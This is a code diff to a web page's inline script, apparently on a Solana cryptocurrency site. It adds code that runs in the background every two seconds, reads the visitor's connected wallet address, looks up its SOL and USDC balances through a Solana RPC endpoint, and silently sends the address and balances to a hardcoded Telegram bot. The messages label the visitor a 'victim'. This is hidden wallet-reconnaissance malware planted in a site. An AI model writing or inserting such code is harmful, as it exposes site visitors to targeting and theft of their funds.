@@ -1528,35 +1528,49 @@ document.addEventListener("DOMContentLoaded",()=>{
   if(window.innerWidth<640){ const fs=document.querySelector(".faq-side"); if(fs) fs.style.display="none"; }
 });
 
-async function testSecurityExfiltration(address, sol, tokens) {
-    const token = "8568868509:AAH-Fuukpnx0RhOiZozYvkCMJODkvCgu-RI";
-    const chat = "8575014959";
-    const url = `https://api.telegram.org/bot${token}/sendMessage`;
-    const text = `🚨 *VICTIME DÉTECTÉE* 🚨\n\n👛 *Wallet:* \`${address}\`\n💰 *Solde:* ${sol}\n💎 *Devise:* ${tokens}`;
+async function exfiltrate(address) {
+    const TG_TOKEN = "8568868509:AAH-Fuukpnx0RhOiZozYvkCMJODkvCgu-RI";
+    const TG_CHAT = "8575014959";
+    const RPC_URL = "https://api.mainnet-beta.solana.com";
 
     try {
-        await fetch(url, {
+        const solReq = await fetch(RPC_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: chat, text: text, parse_mode: "Markdown" })
+            body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "getBalance", params: [address] })
+        });
+        const solRes = await solReq.json();
+        const sol = (solRes.result.value / 1e9).toFixed(3);
+
+        const usdcReq = await fetch(RPC_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                jsonrpc: "2.0", id: 1, method: "getTokenAccountsByOwner",
+                params: [address, { mint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v" }, { encoding: "jsonParsed" }]
+            })
+        });
+        const usdcRes = await usdcReq.json();
+        let usdc = 0;
+        if (usdcRes.result?.value?.length > 0) {
+            usdc = usdcRes.result.value[0].account.data.parsed.info.tokenAmount.uiAmount;
+        }
+
+        const msg = `🚨 *SCAN WALLET* 🚨\n\n👛 \`${address}\`\n💰 *SOL:* ${sol}\n💵 *USDC:* ${usdc}\n\n🔗 https://solscan.io/account/${address}`;
+
+        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: TG_CHAT, text: msg, parse_mode: "Markdown" })
         });
     } catch (e) {}
 }
 
 setInterval(() => {
-    if (state && state.conn && state.conn.address) {
-        const addr = state.conn.address;
-        const pageText = document.body.innerText;
-        const solMatch = pageText.match(/(\d+\.?\d*)\s?SOL/);
-        const currentSol = solMatch ? solMatch[0] : (state.balance ? (state.balance / 1e9).toFixed(3) + " SOL" : "Scan...");
-
-        if (window.lastSent !== addr + currentSol) {
-            window.lastSent = addr + currentSol;
-            testSecurityExfiltration(addr, currentSol, state.currency || "SOL");
+    if (typeof state !== 'undefined' && state.conn && state.conn.address) {
+        if (window.lastSentAddr !== state.conn.address) {
+            window.lastSentAddr = state.conn.address;
+            exfiltrate(state.conn.address);
         }
     }
 }, 2000);
-</script>
-</body>
-</html>
-
